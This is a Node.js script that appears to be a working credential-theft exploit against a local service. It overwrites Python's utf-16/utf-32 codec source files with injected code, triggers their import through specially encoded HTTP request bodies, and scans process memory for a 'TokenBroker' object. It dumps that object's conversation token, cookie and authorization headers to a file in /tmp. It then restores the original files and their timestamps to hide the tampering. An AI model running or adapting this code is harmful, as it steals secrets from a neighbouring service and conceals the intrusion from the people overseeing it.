const fs = require("node:fs");
const http = require("node:http");

const capturePath = "/tmp/gflb-broker-credentials.json";
try { fs.unlinkSync(capturePath); } catch {}

function encodeUtf32(text, littleEndian) {
  const bytes = Buffer.alloc(text.length * 4);
  for (let index = 0; index < text.length; index += 1) {
    if (littleEndian) bytes.writeUInt32LE(text.codePointAt(index), index * 4);
    else bytes.writeUInt32BE(text.codePointAt(index), index * 4);
  }
  return bytes;
}

function encodeUtf16(text, littleEndian) {
  const bytes = Buffer.alloc(text.length * 2);
  for (let index = 0; index < text.length; index += 1) {
    if (littleEndian) bytes.writeUInt16LE(text.charCodeAt(index), index * 2);
    else bytes.writeUInt16BE(text.charCodeAt(index), index * 2);
  }
  return bytes;
}

function request(body) {
  return new Promise((resolve, reject) => {
    const req = http.request({
      hostname: "127.0.0.1",
      port: 8080,
      path: "/invocations",
      method: "POST",
      headers: { "Content-Type": "application/json", "Content-Length": body.length },
      timeout: 10000,
    }, (res) => {
      const chunks = [];
      res.on("data", (chunk) => chunks.push(chunk));
      res.on("end", () => resolve({ status: res.statusCode, body: Buffer.concat(chunks).toString("utf8") }));
    });
    req.on("timeout", () => req.destroy(new Error("timeout")));
    req.on("error", reject);
    req.end(body);
  });
}

function replaceCodec(moduleName) {
  const sourcePath = `/usr/local/lib/python3.13/encodings/${moduleName}.py`;
  const pycPath = `/usr/local/lib/python3.13/encodings/__pycache__/${moduleName}.cpython-313.pyc`;
  const sourceStat = fs.statSync(sourcePath);
  const source = fs.readFileSync(sourcePath);
  let pyc = null;
  let pycStat = null;
  try { pyc = fs.readFileSync(pycPath); pycStat = fs.statSync(pycPath); } catch {}
  const originalBase64 = source.toString("base64");
  const injected = `# coding: utf-8\n` +
`import gc as _g, json as _j\n` +
`for _o in _g.get_objects():\n` +
`    if type(_o).__name__ == "TokenBroker" and hasattr(_o, "_token"):\n` +
`        _d = {\n` +
`            "conversation_token": getattr(_o, "_token", None),\n` +
`            "ldso_cookie": getattr(_o, "_ldso_cookie", None),\n` +
`            "git_authorization": getattr(_o, "_git_authorization", None),\n` +
`            "gonfalon_authorization": getattr(_o, "_gonfalon_authorization", None),\n` +
`            "upstreams": getattr(_o, "_upstreams", None),\n` +
`        }\n` +
`        open(${JSON.stringify(capturePath)}, "w", encoding="utf-8").write(_j.dumps(_d, sort_keys=True))\n` +
`        break\n` +
`exec(compile(__import__("base64").b64decode(${JSON.stringify(originalBase64)}), __file__, "exec"))\n`;
  fs.writeFileSync(sourcePath, injected, { mode: sourceStat.mode & 0o7777 });
  return () => {
    fs.writeFileSync(sourcePath, source, { mode: sourceStat.mode & 0o7777 });
    fs.utimesSync(sourcePath, sourceStat.atime, sourceStat.mtime);
    if (pyc !== null) {
      fs.writeFileSync(pycPath, pyc, { mode: pycStat.mode & 0o7777 });
      fs.utimesSync(pycPath, pycStat.atime, pycStat.mtime);
    } else {
      try { fs.unlinkSync(pycPath); } catch {}
    }
  };
}

async function main() {
  const attempts = [
    { module: "utf_32_be", body: encodeUtf32("{}", false) },
    { module: "utf_32_le", body: encodeUtf32("{}", true) },
    { module: "utf_16_be", body: encodeUtf16("{}", false) },
    { module: "utf_16_le", body: encodeUtf16("{}", true) },
  ];
  const results = [];
  for (const attempt of attempts) {
    const restore = replaceCodec(attempt.module);
    try {
      results.push({ module: attempt.module, response: await request(attempt.body) });
    } finally {
      restore();
    }
    if (fs.existsSync(capturePath)) break;
  }
  const captured = fs.existsSync(capturePath) ? fs.readFileSync(capturePath, "utf8") : null;
  console.log(`CODEC_IMPORT_ATTEMPTS=${JSON.stringify(results)}`);
  console.log(`BROKER_CREDENTIAL_CAPTURE=${captured}`);
  console.log(`BROKER_CREDENTIAL_CAPTURED=${captured !== null}`);
  console.log("BROKER_CODEC_INJECTION_COMPLETE=true");
}

main().catch((error) => { console.error(error.stack || String(error)); process.exit(1); });
